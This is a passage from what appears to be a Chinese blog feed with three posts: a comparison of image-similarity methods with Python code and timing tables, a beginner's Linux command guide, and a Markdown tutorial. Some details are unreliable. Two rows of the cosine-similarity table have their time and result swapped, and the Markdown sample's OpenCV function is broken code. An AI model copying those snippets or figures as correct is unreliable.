rh)) / len(lh)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_similar</span><span class="hljs-params">(li, ri)</span>:</span>    <span class="hljs-keyword">return</span> hist_similar(li.histogram(), ri.histogram())<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    img1 = Image.open(<span class="hljs-string">'images/WIN_20200111_21_56_10_Pro.jpg'</span>)    img1 = make_regalur_image(img1)    img2 = Image.open(<span class="hljs-string">'images/WIN_20200111_21_56_52_Pro.jpg'</span>)    img2 = make_regalur_image(img2)    print(calc_similar(img1, img2))end_time = time()run_time = end_time-begin_time<span class="hljs-keyword">print</span> (<span class="hljs-string">'该程序运行时间：'</span>,run_time)</code></pre></div><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>0.055361032485961914</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>0.06594681739807129</td><td>0.6108132256943336</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>0.05501222610473633</td><td>0.6398035067201021</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.05424642562866211</td><td>0.7139745065909696</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.07813024520874023</td><td>0.7189068678053613</td></tr></tbody></table><h3 id="互信息"><a href="#互信息" class="headerlink" title="互信息"></a>互信息</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *begin_time = time()<span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> metrics <span class="hljs-keyword">as</span> mr<span class="hljs-keyword">from</span> scipy.misc <span class="hljs-keyword">import</span> imread<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np img1 = imread(<span class="hljs-string">'1.jpg'</span>)img2 = imread(<span class="hljs-string">'2.jpg'</span>) img2 = np.resize(img2, (img1.shape[<span class="hljs-number">0</span>], img1.shape[<span class="hljs-number">1</span>], img1.shape[<span class="hljs-number">2</span>])) img1 = np.reshape(img1, <span class="hljs-number">-1</span>)img2 = np.reshape(img2, <span class="hljs-number">-1</span>)print(img2.shape)print(img1.shape)mutual_infor = mr.mutual_info_score(img1, img2) print(mutual_infor)end_time = time()run_time = end_time-begin_time<span class="hljs-keyword">print</span> (<span class="hljs-string">'该程序运行时间：'</span>,run_time)</code></pre></div><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>1.459466791152954</td><td>(6220800,)<br>(6220800,)<br>4.842347326725792</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>1.531355381011963</td><td>(6220800,)<br>(6220800,)<br>1.3835594221461103</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>1.5626063346862793</td><td>(6220800,)<br>(6220800,)<br>1.2697158354875515</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>1.5668601989746094</td><td>(6220800,)<br>(6220800,)<br>1.40573402284614</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>1.5644567012786865</td><td>(6220800,)<br>(6220800,)<br>0.6813656974353114</td></tr></tbody></table><h3 id="余弦相似度"><a href="#余弦相似度" class="headerlink" title="余弦相似度"></a>余弦相似度</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *begin_time = time()<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> average, linalg, dot<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_thumbnail</span><span class="hljs-params">(image, size=<span class="hljs-params">(<span class="hljs-number">1200</span>, <span class="hljs-number">750</span>)</span>, greyscale=False)</span>:</span>    image = image.resize(size, Image.ANTIALIAS)    <span class="hljs-keyword">if</span> greyscale:        image = image.convert(<span class="hljs-string">'L'</span>)    <span class="hljs-keyword">return</span> image<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">image_similarity_vectors_via_numpy</span><span class="hljs-params">(image1, image2)</span>:</span>    image1 = get_thumbnail(image1)    image2 = get_thumbnail(image2)    images = [image1, image2]    vectors = []    norms = []    <span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> images:        vector = []        <span class="hljs-keyword">for</span> pixel_tuple <span class="hljs-keyword">in</span> image.getdata():            vector.append(average(pixel_tuple))        vectors.append(vector)        norms.append(linalg.norm(vector, <span class="hljs-number">2</span>))    a, b = vectors    a_norm, b_norm = norms    res = dot(a / a_norm, b / b_norm)    <span class="hljs-keyword">return</span> resimage1 = Image.open(<span class="hljs-string">'images/WIN_20200111_21_56_10_Pro.jpg'</span>)image2 = Image.open(<span class="hljs-string">'images/WIN_20200111_21_56_10_Pro.jpg'</span>)cosin = image_similarity_vectors_via_numpy(image1, image2)print(cosin)end_time = time()run_time = end_time-begin_time<span class="hljs-keyword">print</span> (<span class="hljs-string">'该程序运行时间：'</span>,run_time)</code></pre></div><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>19.579540729522705</td><td>0.9999999999999746</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>19.23276400566101</td><td>0.9751567803348392</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>19.25089430809021</td><td>0.9726385998457207</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.9807553738212222</td><td>19.210497856140137</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.9038901804349453</td><td>19.01563835144043</td></tr></tbody></table><h3 id="感知哈希算法"><a href="#感知哈希算法" class="headerlink" title="感知哈希算法"></a>感知哈希算法</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *begin_time = time()<span class="hljs-keyword">import</span> cv2<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<span class="hljs-keyword">import</span> os<span class="hljs-comment">#感知哈希算法</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pHash</span><span class="hljs-params">(image)</span>:</span>    image = cv2.resize(image,(<span class="hljs-number">32</span>,<span class="hljs-number">32</span>), interpolation=cv2.INTER_CUBIC)    image = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)<span class="hljs-comment">#     cv2.imshow('image', image)</span><span class="hljs-comment">#     cv2.waitKey(0)</span><span class="hljs-comment">#     cv2.destroyAllWindows()</span>    <span class="hljs-comment"># 将灰度图转为浮点型，再进行dct变换</span>    dct = cv2.dct(np.float32(image))<span class="hljs-comment">#     print(dct)</span>    <span class="hljs-comment"># 取左上角的8*8，这些代表图片的最低频率</span>    <span class="hljs-comment"># 这个操作等价于c++中利用opencv实现的掩码操作</span>    <span class="hljs-comment"># 在python中进行掩码操作，可以直接这样取出图像矩阵的某一部分</span>    dct_roi = dct[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>,<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]    avreage = np.mean(dct_roi)    hash = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(dct_roi.shape[<span class="hljs-number">0</span>]):        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(dct_roi.shape[<span class="hljs-number">1</span>]):            <span class="hljs-keyword">if</span> dct_roi[i,j] &gt; avreage:                hash.append(<span class="hljs-number">1</span>)            <span class="hljs-keyword">else</span>:                hash.append(<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> hash<span class="hljs-comment">#计算汉明距离</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Hamming_distance</span><span class="hljs-params">(hash1,hash2)</span>:</span>    num = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(len(hash1)):        <span class="hljs-keyword">if</span> hash1[index] != hash2[index]:            num += <span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> num<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    image_file1 = <span class="hljs-string">'images/WIN_20200111_21_56_10_Pro.jpg'</span>    image_file2 = <span class="hljs-string">'images/1.jpg'</span>    img1 = cv2.imread(image_file1)    img2 = cv2.imread(image_file2)    hash1 = pHash(img1)    hash2 = pHash(img2)    dist = Hamming_distance(hash1, hash2)    <span class="hljs-comment">#将距离转化为相似度</span>    similarity = <span class="hljs-number">1</span> - dist * <span class="hljs-number">1.0</span> / <span class="hljs-number">64</span>    print(dist)    print(similarity)end_time = time()run_time = end_time-begin_time<span class="hljs-keyword">print</span> (<span class="hljs-string">'该程序运行时间：'</span>,run_time)</code></pre></div><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>distance</th><th>similarity</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>0.20314764976501465</td><td>0</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>0.2085726261138916</td><td>4</td><td>0.9375</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>0.20518183708190918</td><td>0</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.20314764976501465</td><td>5</td><td>0.921875</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.18751096725463867</td><td>8</td><td>0.875</td></tr></tbody></table><h2 id="3-评价"><a href="#3-评价" class="headerlink" title="3.评价"></a>3.评价</h2><ul><li>直方图计算结果与直观视觉严重不符合</li><li>余弦相似度准确度较高，但太耗时，比对平均耗时19s</li><li>互信息的方法从耗时和准确度上粗略观察，介于直方图和余弦相似度之间</li><li>感知哈希算法耗时较为可接受，且比对结果较有区分度且符合直观视觉</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2019/11/21/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/11/21/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>开口就是老rm - rf了</p><div class="hljs code-wrapper"><pre><code class="hljs shell">command [-options] [parameter]</code></pre></div><table><thead><tr><th>command</th><th>[-options]</th><th>[parameter]</th></tr></thead><tbody><tr><td>命令名称</td><td>选项</td><td>传递给命令的参数</td></tr></tbody></table><h2 id="help-amp-amp-man"><a href="#help-amp-amp-man" class="headerlink" title="help&amp;&amp;man"></a>help&amp;&amp;man</h2><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><code>command --help</code><br> 显示command 命令的帮助信息</p><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><p><code>man command</code><br> 查询command 命令的使用手册</p><blockquote><p>man 是<strong><em>manual</em></strong>的缩写，是Linux提供的手册。</p></blockquote><h3 id="手册中的操作按键"><a href="#手册中的操作按键" class="headerlink" title="手册中的操作按键"></a>手册中的操作按键</h3><table><thead><tr><th>操作按键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示下一页</td></tr><tr><td>回车键</td><td>显示下一行</td></tr><tr><td>b</td><td>back，显示上一页</td></tr><tr><td>f</td><td>forward，向前和空格效果一样</td></tr><tr><td>q</td><td>quit，退出</td></tr></tbody></table><h2 id="常用的Linux命令"><a href="#常用的Linux命令" class="headerlink" title="常用的Linux命令"></a>常用的Linux命令</h2><p>有了上面的基本常识之后，我们终于可以开始尝试Linux的命令了！接下来给大家介绍几个简单的命令。</p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>ls</td><td>list，列表显示当前目录下的内容</td></tr><tr><td>pwd</td><td>print wrok directory ，查看当前所在路径</td></tr><tr><td>cd+空格+路径名称</td><td>change directory,跳转到指定路径</td></tr><tr><td>touch+空格+文件名称</td><td>创建这个文件</td></tr><tr><td>mkdir+空格+文件夹名称</td><td>make directory， 创建这个文件夹</td></tr><tr><td>rm+空格+文件名</td><td>remove,删除指定的文件</td></tr><tr><td>clear</td><td>清屏</td></tr></tbody></table><h2 id="常用的Linux命令选项"><a href="#常用的Linux命令选项" class="headerlink" title="常用的Linux命令选项"></a>常用的Linux命令选项</h2><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><p>ls是英文单词list的缩写，他的功能是列出当前目录下的文件列表，是非常常见的Linux命令之一。</p><h5 id="Linux下目录特点"><a href="#Linux下目录特点" class="headerlink" title="Linux下目录特点"></a>Linux下目录特点</h5><ul><li>以 <code>.</code> 开头的文件是隐藏文件，使用ls查看时，需要加上 <code>-a</code>（all）参数才能显示。</li><li><code>.</code>代表当前目录 <code>..</code>代表上一级目录(可以理解为隐藏的两个文件路径)。我们常用<code>cd..</code>跳到上一级目录。</li></ul><h3 id="ls常用选项"><a href="#ls常用选项" class="headerlink" title="ls常用选项"></a>ls常用选项</h3><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-a]</td><td>all，显示所有内容，包含隐藏文件</td></tr><tr><td>[-l]（字母L小写）</td><td>显示文件详细信息</td></tr><tr><td>[-h]</td><td>human-readable,需要配合<code>-l</code>(字母L小写)选项，所谓的人性化显示</td></tr></tbody></table><h3 id="ls配合通配符"><a href="#ls配合通配符" class="headerlink" title="ls配合通配符"></a>ls配合通配符</h3><table><thead><tr><th>通配符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>代表任意多个任意字符，可以没有字符</td></tr><tr><td>?</td><td>代表就是一个任意字符，至少一个字符</td></tr><tr><td>[ ]</td><td>代表一个字符，取值范围在[ ]中</td></tr><tr><td>[1234 ]</td><td>匹配1，2，3，4中的任意一个</td></tr><tr><td>[a-g]</td><td>匹配从a到g范围内的任意一个</td></tr></tbody></table><h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p><code>cd</code>是英文单词 <strong><em>change directory\</em></strong> 的缩写，其功能就是跳转目录。<br> 它与之前的几个命令不同的是，<code>cd</code>是BASH内置命令，没有帮助文档与相关手册。<br> 所以在使用<code>$which cd</code>的时候是看不到它的二进制路径的。因为系统中不存在 cd 命令的二进制文件。</p><blockquote><p><strong>注意</strong>：Linux下 <strong><em>目录名称</em></strong> 以及 <strong>文件名称</strong> <strong>大小写</strong>是有区别的！</p></blockquote><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>cd</td><td>切换到当前用户的家目录（home/用户名）</td></tr><tr><td>cd ~</td><td>和 cd 效果一样</td></tr><tr><td>cd ..</td><td>跳转到上一级目录</td></tr><tr><td>cd -</td><td>在最近两个目录来回切换，有点像图形界面的 Alt + Tab切换窗口的感觉</td></tr></tbody></table><p><code>cd</code>后面的路径可以是两种 <strong>相对路径</strong> 和 <strong>绝对路径</strong></p><ul><li><strong>相对路径</strong>是指相对当前目录的路径</li><li><strong>绝对路径</strong>是指全路径。可以从 /（根目录）开始，或者是~（家目录）开始。</li></ul><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><ul><li>创建一个新的目录</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-p]</td><td>可以递归创建目录</td></tr></tbody></table><blockquote><p>新建的目录名称不能重名</p></blockquote><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><ul><li>删除文件或目录</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-f]</td><td>强制删除，忽略不存在的文件，无需提示</td></tr><tr><td>[-r]</td><td>递归删除目录下的内容，删除<strong>文件夹</strong>就用这个选项</td></tr></tbody></table><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><ul><li>拷贝文件或者目录，类似DOS中的copy</li></ul><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$cp</span> 源文件 目标文件</code></pre></div><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-i]</td><td>interactive互动，说白了就是覆盖文件时有提示</td></tr><tr><td>[-r]</td><td>如果cp跟上的时目录，那么将会递归拷贝目录下的所有子目录和文件</td></tr></tbody></table><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><ul><li><code>mv</code>是move的缩写 用来 <strong>移动文件/目录</strong> </li><li>小技巧：如果需要重命名，也可以使用mv命令<strong>覆盖</strong>当前文件/目录 达到效果</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-i]</td><td>interactive,覆盖文件时有提示</td></tr></tbody></table><h2 id="tree命令"><a href="#tree命令" class="headerlink" title="tree命令"></a>tree命令</h2><ul><li><code>tree</code>命令可以将目录结构显示出来（树状显示）</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-d]</td><td>directory，只显示目录</td></tr></tbody></table><blockquote><p>有的同学系统中默认没有此命令。所以会提示：</p><p> <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2990730-7545ff5d5b44b0bb.webp" srcset="/img/loading.gif" lazyload="" alt="img"> </p></blockquote><p>你看写得多清楚,在Ubuntu下使用apt安装。</p><div class="hljs code-wrapper"><pre><code class="hljs csharp">$ sudo apt-<span class="hljs-keyword">get</span> install tree</code></pre></div><h2 id="查看文件内容相关命令"><a href="#查看文件内容相关命令" class="headerlink" title="查看文件内容相关命令"></a>查看文件内容相关命令</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>cat 文件名</td><td>concatenate,查看文件内容、创建文件、文件合并、追加文件内容等</td></tr><tr><td>more 文件名</td><td>more,分屏显示文件内容（内容多一般用more）</td></tr><tr><td>grep 搜索内容 文件名</td><td>grep，搜索文件内容</td></tr></tbody></table><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><ul><li>查看文件内容、创建文件、文件合并、追加文件内容等</li><li>命令会一次性显示所有内容，所以适合查看内容较少的文件</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-b]</td><td>显示每一行的行号</td></tr><tr><td>[-n]</td><td>只显示有内容的行号，空行不算一行</td></tr></tbody></table><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><ul><li>此命令可以分屏显示文件内容，每次只显示一页内容。所以适合查看内容多的文件。<br> 使用<code>more</code>的操作按键</li></ul><table><thead><tr><th>操作按键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示下一页</td></tr><tr><td>回车键 Enter</td><td>显示下一行</td></tr><tr><td>b</td><td>back，显示上一页</td></tr><tr><td>f</td><td>forward，向前和空格效果一样</td></tr><tr><td>q</td><td>quit，退出</td></tr><tr><td>/ 搜索文字</td><td>搜索文本中的内容</td></tr></tbody></table><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><ul><li>（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</li></ul><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-n]</td><td>line-number，显示匹配行及行号</td></tr><tr><td>[-v]</td><td>invert-match，选中不匹配的行</td></tr><tr><td>[-i]</td><td>ignore-case，忽略大小写</td></tr></tbody></table><h4 id="grep常用查找方式"><a href="#grep常用查找方式" class="headerlink" title="grep常用查找方式"></a>grep常用查找方式</h4><ul><li>在file_name中 搜索Hello_world这个单词</li></ul><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$grep</span> Hello_world file_name<span class="hljs-variable">$grep</span> <span class="hljs-string">"Hello_world"</span> file_name</code></pre></div><ul><li>在多个文件中查找</li></ul><div class="hljs code-wrapper"><pre><code class="hljs bash">grep <span class="hljs-string">"Hello_world"</span> file_1 file_2 file_3 ...</code></pre></div><ul><li>常用两种模式查找</li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>^hello</td><td>行首，搜索以hello开头的行</td></tr><tr><td>world$</td><td>行尾，搜索以world结束的行</td></tr></tbody></table><h2 id="几个常用符号"><a href="#几个常用符号" class="headerlink" title="几个常用符号"></a>几个常用符号</h2><h3 id="重定向符号"><a href="#重定向符号" class="headerlink" title="重定向符号"></a>重定向符号</h3><ul><li>Linux中允许将命令执行结果 <strong>重定向</strong>到一个文件</li><li>将本应该显示在<strong>终端上的内容  输出/追加</strong> 到<strong>指定文件中</strong> </li></ul><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td>&gt;</td><td>输出重定向到一个文件或设备 覆盖原来的文件</td></tr><tr><td>&gt;&gt;</td><td>输出重定向到一个文件或设备 追加原来的文件</td></tr></tbody></table><ul><li><code>echo</code>会在终端中显示参数指定的文字，通常会和 <strong>重定向</strong> 联合使用</li></ul><h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号 |"></a>管道符号 |</h3><ul><li>Linux 允许将 <strong>一个命令的输出</strong> 可以 <strong>通过管道</strong> 做为 <strong>另外一个命令的输入</strong> </li></ul><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> 1 |  <span class="hljs-built_in">command</span> 2 |  <span class="hljs-built_in">command</span> 3 … …</code></pre></div><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/abbd06b1ff27" target="_blank" rel="noopener">002–Linux终端命令简介  请叫我Hank</a></p><p><a href="https://www.jianshu.com/p/288499cf29ea" target="_blank" rel="noopener">003–Linux常用命令的常见选项 请叫我Hank</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown精简教程</title>
      <link href="/2019/11/15/markdown%E7%B2%BE%E7%AE%80%E6%95%99%E7%A8%8B/"/>
      <url>/2019/11/15/markdown%E7%B2%BE%E7%AE%80%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>一个代替word的简洁文本编辑器</p><a id="more"></a><h2 id="为什么要用markdown？"><a href="#为什么要用markdown？" class="headerlink" title="为什么要用markdown？"></a>为什么要用markdown？</h2><p>emmm……word相比markdown，其优点在于不用排版（word不刻意去排版真的很难看）</p><p>对新手来说，会觉得这纯粹找事，但是熟练之后不管是做笔记还是会议记录，甚至是写论文markdown都比已有的工具方便得多。</p><p>此外markdown支持html和 latex 语法（word也支持latex，但那个渲染真的无语了）</p><p>看看这么多人都用markdown，大部分都是刚学的时候觉得啥玩意？~之后，真香</p><p>你能相信下面的全是用markdown写出来的吗？（只要动键盘就行了）</p><p>水平分割线</p><hr><ul><li>支持latex</li></ul><p>$$<br>y_{\theta}=\sum_{i=1}^n   \int_0^{+\infty}\frac{\sigma}{x^2} dx<br>$$</p><ul><li>代码块~语法高亮</li></ul><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cv_imread</span><span class="hljs-params">(file_path)</span>:</span> cv_img=cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), <span class="hljs-number">-1</span>)         cv_img = cv2.IMREAD_GRAYSCALE(img)<span class="hljs-keyword">return</span> cv_img</code></pre></div><ul><li>流程图</li></ul><div class="hljs code-wrapper"><pre class="mermaid">graph LRA[信源]--&gt;B[发送设备]B[发送设备]--&gt;C[信道]D[噪声源]--&gt;C[信道]C[信道]--&gt;E[接收设备]E[接收设备]--&gt;F[信宿]</pre></div><ul><li>有序列表</li></ul><ol><li>任务A</li><li>任务B<ol><li>任务C</li><li>任务D</li></ol></li></ol><ul><li>无序列表</li><li>列表<ul><li>A</li><li>B<ul><li>D<ul><li>E</li></ul></li></ul></li><li>C</li></ul></li></ul><p><strong>加粗</strong>、<em>斜体</em>、<u>下划线</u></p><p><a href="https://www.baidu.com/" target="_blank" rel="noopener">超链接</a></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" srcset="/img/loading.gif" lazyload="" alt="引入图像"></p><ul><li><p>支持html，例如用html的<kbd>img</kbd>标签引入图像,<kbd>center</kbd>标签控制居中，<kbd>width</kbd>控制图片大小</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" srcset="/img/loading.gif" lazyload="" width="30%"></center></li></ul><ul><li><p>表格</p><table><thead><tr><th>A</th><th align="center">B</th><th align="right">C</th></tr></thead><tbody><tr><td>哈哈</td><td align="center">呵呵</td><td align="right">嗯哼</td></tr></tbody></table></li></ul><p>编写的文档很自然地可以导出成<kbd>html</kbd>或者<kbd>PDF</kbd>、<kbd>word</kbd>等,图像品质不会压缩。另外大多数博客平台都支持markdown排版，例如这篇就是用markdown写的(都是统一的，就不会像word那样出现乱码或者排版不对这些情况)。相比word，markdown更简洁，功能较少但能让人<strong>专注于写作</strong>（就是不需要去排版，但排版仍然会很好看）</p><hr><p>如果刚开始用不熟悉，也不是非得用键盘，有些markdown编辑软件支持鼠标点击打开某项功能，比如黑体、代码块，表格等。</p><p>常见的一些markdown语法（其实语法不多，但一开始就记一堆，难免会让人难以接受，建议先掌握下面这些常用的，以后用写笔记markdown编辑器代替word就好啦，<strong>用过几次后自然熟悉</strong>）</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>一级标题: <kbd>#</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd></p><p>二级标题: <kbd>##</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd> </p><p>……</p><p>六级标题: <kbd>######</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd></p><h2 id="黑体斜体"><a href="#黑体斜体" class="headerlink" title="黑体斜体"></a>黑体斜体</h2><p><kbd> * </kbd>  + <kbd>文字</kbd>+ <kbd> * </kbd>让文字变成斜体，注意中间不带空格，如：</p><p><em>文字</em></p><p><kbd>* *</kbd>+<kbd>文字</kbd>+ <kbd>**</kbd>  让文字变成黑体，注意中间不带空格，如：</p><p><strong>文字</strong></p><p>只一个<kbd>*</kbd>+<kbd>空格</kbd> 会出现一个点，如：</p><ul><li></li></ul><p>连续输入三个<kbd>*</kbd>会变成分割线，如:</p><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p><kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>[</kbd>  有序列表</p><p><kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>]</kbd>   无序列表</p><h2 id="代码块和公式块"><a href="#代码块和公式块" class="headerlink" title="代码块和公式块"></a>代码块和公式块</h2><p>代码块： <kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>K</kbd>  </p><p>latex公式块： <kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>M</kbd>  </p><p>这些是基础操作，如果各位还会写html或latex语法的话更佳，不会也不要紧，掌握上述命令即可自(wu)由(nai)写作。</p><p>markdown编辑器有很多，我个人比较喜欢用typora，附上win10_64位的下载链接，<a href="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/download/typora-setup-x64.exe" target="_blank" rel="noopener">Typora</a></p><p>官网： <a href="https://www.typora.io/" target="_blank" rel="noopener">https://www.typora.io/</a> (官网下载很慢哦)</p><h2 id="emoji表情"><a href="#emoji表情" class="headerlink" title="emoji表情"></a>emoji表情</h2><p>此外还支持一堆emoji表情，不信你看👉 <a href="https://www.webfx.com/tools/emoji-cheat-sheet/" target="_blank" rel="noopener">emoji</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () 